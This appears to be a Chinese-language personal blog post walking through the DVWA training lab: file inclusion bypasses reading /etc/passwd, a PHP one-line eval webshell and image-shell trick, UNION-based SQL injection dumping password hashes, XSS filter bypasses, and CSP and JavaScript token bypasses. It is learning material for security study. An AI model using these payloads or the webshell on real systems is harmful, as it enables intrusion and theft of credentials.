<h2 id="远程文件包含"><a class="markdownIt-Anchor" href="#远程文件包含"></a> 远程文件包含</h2>
<p>当服务器的 php 配置中，选项 allow_url_fopen 与 allow_url_include 为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。使用下面的 url 来去访问另外一台设备上的文件。
/dvwa/vulnerabilities/fi/?page=<a target="_blank" rel="noopener" href="http://192.168.181.203:8012">http://192.168.181.203:8012</a>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/102781669">
</a></p>
<h2 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。同时，因为替换的只是“…/”、“…\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。
/dvwa/vulnerabilities/fi/<code>?page=/etc/passwd</code> 依旧可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> )</span><br></pre></td></tr></table></figure>
<p>开头必须是 file，可以用 file 协议绕过：<code>?page=file:///etc/passwd</code><a target="_blank" rel="noopener" href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29">
</a></p>
<h1 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h1>
<p>php 一句话木马：<code>&lt;?php @eval($_POST['shell'])?&gt;</code>
上传成功后用蚁剑或者菜刀连接
遇到几个小问题：</p>
<ul>
<li>蚁剑的使用方法：
<ul>
<li>url 处须填上传的文件所在地址</li>
<li>密码处填单引号里的内容，以上文为例，填 shell</li>
</ul>
</li>
<li>指定文件类型
<ul>
<li>bp 抓包，改文件内容处的 Content-Type</li>
<li><code>copy 1.jpg/b + muma.php/a muma.jpg</code> - 参数/b 指定以二进制格式复制、合并文件; 用于图像类/声音类文件
参数/a 指定以 ASCII 格式复制、合并文件。用于 txt 等文档类文件 - 需结合命令注入漏洞，把<code>muma.jpg</code>改成<code>muma.php</code></li>
</ul>
</li>
</ul>
<p>hard 难度仅在包里改文件后缀和 Content-Type 没用，还是得造图片马
比较坑的是，在 powershell 里的 copy 命令总是报错，在 cmd 里正常运行，离谱离谱</p>
<h1 id="insecure-captcha"><a class="markdownIt-Anchor" href="#insecure-captcha"></a> Insecure CAPTCHA</h1>
<p>验证码的 key 没有正确配置，我这儿没显示，不过可以学一下绕过方法
感觉这个主要是代码审计，easy 难度第一步验证 CAPTCHA（step=1），第二步（step=2）再修改密码，可以抓包修改 step 的值绕过；medium 难度，构造参数 passed_captcha=true 绕过；hard 差不多也是构造参数</p>
<h1 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h1>
<p><a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/102793220">DVWA 之 SQL Injection</a>讲的挺好，就是赋值的时候的符号
user(),database(),version()
Surname: dvwa@localhost dvwa 8.0.29-0ubuntu0.20.04.3
1’ and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=‘dvwa’ and table_name=‘users’ #
Surname: guestbook,users</p>
<p>union select group_concat(user_id,first_name,last_name),group_concat(password)
First name: 1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith
Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99
然后是这个样子的 sql 注入
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FvjR1z74mcTuTx4kxTSMng_F5rAX.png" alt="" />
抓包改数据，然后发现’和“符号转义了，所以不可以直接写库名和表名了，需要将库名和表名转别的形式：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FquVLoKKNKLKgpm-CVog2IKVukww.png" alt="" />
构造的注入语句：
1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=concat(char(100),char(118),char(119),char(97)) and table_name=concat(char(117),char(115),char(101),char(114),char(115)) #
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fps-ZS5TbL5Nu3DVL-5vcnZ5LqHt.png" alt="" />
High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，加#注释掉就行了（刚开始随便试了一下，没想到直接成了）</p>
<h1 id="sql-盲注"><a class="markdownIt-Anchor" href="#sql-盲注"></a> SQL 盲注</h1>
<p><a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/102794083">SQL Injection(Blind)</a> 依旧写的很详细了，正常人用 sqlmap 吧</p>
<h1 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids"></a> Weak Session IDs</h1>
<p>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是 SessionID。
当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的 Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个 Session，浏览器需要把当前用户持有的 SessionID 告知服务器。SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。
以前没见过这个漏洞，看了漏洞利用手段，感觉有点像密码学攻击的手段，SessionID 和密钥的定义差不多。
看代码可以知道，easy 难度是 SessionID 从 0 开始累加、medium 难度将 SessionID 的值改成了当前的时间，hard 难度 MD5(i++,time)，缺少随机性。果然 impossible 难度用了随机数生成+sha1，随机性增强，破解难度大大提高。</p>
<h1 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h1>
<p>xss，看上去就是造个弹窗，看看定义：指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行。或许弹窗就是执行命令的方式？</p>
<h2 id="dom-型-xss"><a class="markdownIt-Anchor" href="#dom-型-xss"></a> DOM 型 XSS</h2>
<p>dom xss 的产生并没有和后台服务器产生交互，而是通过浏览器的 dom 树解析产生的。
DOM（Document Object Model）即文档对象模型，一种处理 HTML 和 XML 文件的标准 API。以前一直没 get 到 dom 树是什么东西，自从自己写了个网页之后就顿悟，就是 HTML 的标签树。</p>
<p>easy 后端 php 没代码，纯纯靠 js 验证，看看网页代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">&quot;XSS&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>利用方法：在<code>/dvwa/vulnerabilities/xss_d/?default=English</code>中直接将 English 改为<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，为什么修改参数会触发弹窗呢？
大概是服务器把前端传过来的参数，过滤过滤在传回来吧</p>
<blockquote>
<p>根据恶意代码是否存储在服务器中，XSS 可以分为存储型的 XSS 与反射型的 XSS。DOM 型的 XSS 由于其特殊性，常常被分为第三种，这是一种基于 DOM 树的 XSS。例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html 页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的 XSS。DOM 型 XSS 可能是存储型，也有可能是反射型。</p>
</blockquote>
<p>原理差不多，过程不一样
medium 后端有过滤：</p>
<ol>
<li>构造链接<code>/dvwa/vulnerabilities/xss_d/?#default=&lt;script&gt;alert('xss')&lt;/script&gt;</code>，#后面的东西不会发给服务器</li>
<li>用 img 标签或其他标签的特性去执行 js 代码，比如 img 标签的 onerror 事件，构造连接</li>
</ol>
<p>之前用过 img 的方法，这次使用 svg 的方法来完成。
<code>/dvwa/vulnerabilities/xss_d/?default=&lt;/option&gt;&lt;/select&gt;&lt;svg onload=alert(&quot;xss&quot;)&gt;</code>
svg 意为可缩放矢量图形，在加载的时候弹窗
hard 难度要求 default 的值必须为 select 选择菜单中的值，用#来绕过注入代码</p>
<h2 id="反射性-xss"><a class="markdownIt-Anchor" href="#反射性-xss"></a> 反射性 xss</h2>
<p>绕过方法：</p>
<ol>
<li>双写绕过
输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></li>
<li>大小写混淆绕过
输入<code>&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</code></li>
<li>通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。
输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></li>
</ol>
<h2 id="存储型-xss"><a class="markdownIt-Anchor" href="#存储型-xss"></a> 存储型 XSS</h2>
<p>绕过方法一样，利用过程不同：存储型 xss 将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发。
多见于留言板</p>
<h1 id="content-security-policy-csp-bypass"><a class="markdownIt-Anchor" href="#content-security-policy-csp-bypass"></a> Content Security Policy (CSP) Bypass</h1>
<p>CSP 指的是内容安全检测，又称网页安全政策，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。</p>
<p>首先可以 F12-&gt;网络-&gt;发送一个请求，可以看到请求头的限制，然后根据提供的地址尝试有没有包含成功，再者构造自己的地址看看能不能成功
<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>中直接给服务器上传了一个 xss 代码文件（引入外部 js），我试了一下蚁剑，发现不太行，然后也是直接 xftp 传了一个过去</p>
<p>meduim 难度发现<code>unsafe-inline</code>参数，然后有<code>nonce</code>，作用在<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30762087/article/details/96272416?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;utm_relevant_index=2">这里</a>有提到</p>
<ul>
<li>nonce-&lt;base64 值&gt;：</li>
</ul>
<p>特定使用一次性加密内联脚本的白名单。服务器必须在每一次传输政策时生成唯一的一次性值。否则将存在绕过资源政策的可能。
但是这题 php 代码中把 nonce 写死，于是就可以利用这个 nonce 进行 XSS（内联 JavaScript 代码）
hard 难度：
请求网址:
<code>http://121.37.194.38/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code>
这个 callback 参数是不是调用一个函数，看<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>的意思大概是这个？抓包修改这个参数，弹窗成功</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大概意思是新建一个 script 标签（HTML 元素），指定这个标签 src 的属性，然后追加该标签
按理说不至于啊，这都没有给他接受 callback 参数的机会，然后<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13714694.html">这里</a>提到 jsonp.php 获取 callback 参数后没有做任何过滤，拿源码一看，果然！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;callback&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">  <span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outp</span> = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span> . <span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$outp</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="javascript-attacks"><a class="markdownIt-Anchor" href="#javascript-attacks"></a> JavaScript Attacks</h1>
<p>easy 难度看源码，js 脚本直接在页面源码里，照<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103168248">Js 攻略</a>这里改就行了，然后补充一点，浏览器执行 js 脚本直接 F12 控制台，输入函数名<code>generate_token()</code>即可。
中等难度，js 不在前端，但可以得到 js 代码地址 ：<code>yourip/dvwa/vulnerabilities/javascript/source/medium.js</code>，直接访问可以看到生成 token 的函数叫<code>do_elsesomething(&quot;XX&quot;)</code>，改完 value 后控制台跑一遍即可。
发现<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13739003.html">DVWA 通关指南：JavaScript Attacks (前端攻击)</a>这里讲的更好。
根据上一步的方法查看 high.js 的内容，确实是一团乱码，根据<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">js 混淆还原工具 </a>可以得到 js 代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>);</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
<p>这段代码的大致意思是 300ms 后执行 token_part_2，增加点击事件 token_part_3，执行 token_part_1
实际上的执行顺序是 token_part_1，token_part_2，token_part_3，但因为 token_part_3 会在点击之后自动执行，所以只需要修改 value 后，依次执行<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">c4ooc0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">22k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:22</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://lib.baomitu.com/canvas-nest.js/1.0.1/canvas-nest.js"></script>


    </div>
  </footer>

  
  <script src="https://lib.baomitu.com/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://lib.baomitu.com/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  
  <div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
  <span class="site-uv" title="总访客量">
    我的第<span id="busuanzi_value_site_uv"></span>位朋友, 
  </span>

  <span class="site-pv" title="总访问量">
    经过<span id="busuanzi_value_site_pv"></span>次回眸与你相遇
  </span>
</div>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"per_page":true,"tags":"none","engine":"mathjax","js":{"url":"https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<script class="next-config" data-name="exif" type="application/json">"{FocalLength}mm f/{FNumber} {ExposureTime}s"</script>
<script src="https://fastly.jsdelivr.net/npm/exif-js@2/exif.min.js"></script>
<script src="/lib/exif.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
</html>
